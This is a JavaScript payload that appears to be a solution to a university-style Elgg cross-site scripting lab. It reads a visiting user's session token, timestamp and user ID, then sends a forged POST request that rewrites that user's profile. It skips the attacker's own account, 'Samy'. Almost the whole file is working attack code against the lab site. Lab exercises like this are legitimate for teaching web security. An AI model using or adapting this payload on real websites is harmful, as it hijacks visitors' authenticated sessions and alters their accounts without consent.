//<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" +elgg.security.token.__elgg_token;
	
	var ownerID = elgg.session.user.guid;
	var name = "&name=" + elgg.session.user.name;

	var samyID = 47;
	//Construct the content of your url.

	//editing a profile will generate a post request with this url.
    var sendurl = "http://www.xsslabelgg.com/action/profile/edit"; //FILL IN

	var content = ""//FILL IN

	//content requires token and ts at the beginning
	content += token + ts + name;

	//adding key-value pairs to the content
	//&key=value
	//this conent will be passed as the body of the post request.
	//accesslevel[key] = 1 means only logged in users

	content += "&briefdescription=1605020" + "&accesslevel[briefdescription]=1";
	content += "&contactemail=1605020@email.com" + "&accesslevel[contactemail]=1";
	content += "&description=1605020" + "&accesslevel[description]=1";
	content += "&interests=nothing" + "&accesslevel[interests]=1";
	content += "&location=mars" + "&accesslevel[location]=1";
	content += "&mobile=1605020" + "&accesslevel[mobile]=1";
	content += "&phone=1605020" + "&accesslevel[phone]=1";
	content += "&skills=nothing" + "&accesslevel[skills]=1";
	content += "&twitter=twitter" + "&accesslevel[twitter]=1";
	content += "&website=http://www.xsslabelgg.com" + "&accesslevel[website]=1";

	content += "&guid=" + ownerID;
	
	//content += "__elgg_token"


	//block updating Samy's profile if he vistis there himself
	if(ownerID != samyID)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
//</script>